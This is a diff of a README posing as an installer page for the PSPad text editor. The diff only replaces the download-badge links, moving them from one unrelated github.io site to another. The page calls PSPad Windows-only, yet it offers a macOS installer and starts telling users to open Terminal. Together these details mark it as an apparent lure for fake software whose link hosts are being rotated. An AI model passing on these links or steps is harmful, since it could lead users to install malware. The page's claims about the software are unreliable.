@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About PSPad
 
-PSPad is a free, feature-rich text and code editor for Windows. Supports syntax highlighting for hundreds of programming languages, macro recording, a built-in FTP client, a hex editor, and project management. PSPad's comprehensive feature set covers developer needs from writing code to editing configuration files, making it a versatile all-in-one text editing solution for Windows power users.
+PSPad is a free, feature-rich text and code editor for Windows. It supports syntax highlighting for over 100 programming languages, hex editor, FTP client, macro recording, diff viewer, and extensive customization — a powerful tool for developers and power users.
 
 ---
 
 ## ❌ Problem: PSPad is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **UI Dated** — Interface design reflects an older era of Windows software
-- **Development Pace** — Update releases less frequent than modern editors
-- **Extensions** — Plugin ecosystem smaller than editors like Notepad++
+- **Windows Only** — Not available on macOS or Linux
+- **Dated Interface** — UI design has not significantly modernized
+- **Development Pace** — Updates arrive infrequently compared to actively developed editors
+- **64-bit Support** — Historical compatibility issues with 64-bit Windows versions
 
 ---
 
@@ -61,9 +61,9 @@ PSPad is a free, feature-rich text and code editor for Windows. Supports syntax 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ PSPad is a free, feature-rich text and code editor for Windows. Supports syntax 
 
 <div align="center">
 
-[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ PSPad is a free, feature-rich text and code editor for Windows. Supports syntax 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ PSPad is a free, feature-rich text and code editor for Windows. Supports syntax 
 
 <div align="center">
 
-[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install PSPad](https://img.shields.io/badge/⬇_Install_PSPad-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
